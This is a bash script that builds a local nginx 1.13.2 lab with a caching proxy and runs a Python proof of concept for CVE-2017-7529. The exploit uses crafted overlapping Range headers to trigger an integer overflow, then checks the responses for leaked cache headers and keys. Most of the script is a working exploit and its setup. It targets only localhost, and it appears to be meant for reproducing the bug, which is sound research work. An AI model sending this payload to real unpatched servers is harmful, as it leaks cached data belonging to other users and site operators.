#!/usr/bin/env bash
set -e
LAB="$HOME/nginx-poc-lab"
POCLAB="/mnt/d/download/PoClab/PoCLab"
NGX="$LAB/nginx-1.13.2/sbin/nginx"
kill "$(cat "$LAB/7529-up.pid" 2>/dev/null)" 2>/dev/null || true
kill "$(cat "$LAB/7529.pid" 2>/dev/null)" 2>/dev/null || true
fuser -k 18081/tcp 2>/dev/null || true
fuser -k 17529/tcp 2>/dev/null || true
sleep 1
python3 - <<'PY' >"$LAB/www/index.html"
import html
body = "<html><head><title>CVE-2017-7529</title></head><body><h1>nginx cache leak lab</h1><p>" + ("A"*8000) + "</p></body></html>"
print(body)
PY
cat >"$LAB/conf/7529-upstream.conf" <<EOF
worker_processes 1;
error_log $LAB/7529-up-error.log warn;
pid $LAB/7529-up.pid;
events { worker_connections 64; }
http {
    server {
        listen 18081;
        root $LAB/www;
        index index.html;
    }
}
EOF
cat >"$LAB/conf/7529-vulhub.conf" <<EOF
worker_processes 1;
error_log $LAB/7529-error.log info;
pid $LAB/7529.pid;
events { worker_connections 64; }
http {
    proxy_cache_path $LAB/cache levels=1:2 keys_zone=cache_zone:10m max_size=100m inactive=60m use_temp_path=off;
    server {
        listen 17529;
        location / {
            proxy_pass http://127.0.0.1:18081/;
            proxy_set_header Host \$host;
            proxy_cache cache_zone;
            proxy_cache_valid 200 10m;
            proxy_ignore_headers Set-Cookie;
            add_header X-Proxy-Cache \$upstream_cache_status;
        }
    }
}
EOF
rm -rf "$LAB/cache"/*
"$NGX" -c "$LAB/conf/7529-upstream.conf"
"$NGX" -c "$LAB/conf/7529-vulhub.conf"
echo "=== warm cache ==="
curl -s http://127.0.0.1:17529/ >/dev/null
curl -sI http://127.0.0.1:17529/ | grep -E 'HTTP|Content-Length|Cache|Accept'
echo "=== normal range ==="
curl -s -D - -o /tmp/rng -H 'Range: bytes=0-99' http://127.0.0.1:17529/ | head -10
echo "range_body=$(wc -c </tmp/rng)"
echo "=== vulhub poc ==="
python3 <<'PY'
import requests, sys
url = "http://127.0.0.1:17529/"
headers = {"User-Agent": "PoCLab/CVE-2017-7529"}
base = requests.get(url, headers=headers)
file_len = len(base.content)
print("file_len", file_len, "CL", base.headers.get("Content-Length"), "cache", base.headers.get("X-Proxy-Cache"))
for offset in [605, 623, 650]:
    n = file_len + offset
    headers["Range"] = "bytes=-%d,-%d" % (n, 0x8000000000000000 - n)
    r = requests.get(url, headers=headers, timeout=15)
    print("offset", offset, "status", r.status_code, "resp_len", len(r.content))
    if r.status_code == 206 or r.content != base.content:
        print(r.text[:500])
        if "HTTP/" in r.text or "KEY:" in r.text or "Content-Range" in r.text:
            print("[+] LEAK DETECTED")
            sys.exit(0)
print("[-] no leak")
sys.exit(1)
PY
echo "poc_exit=$?"
echo "=== error log ==="
tail -8 "$LAB/7529-error.log" 2>/dev/null || true
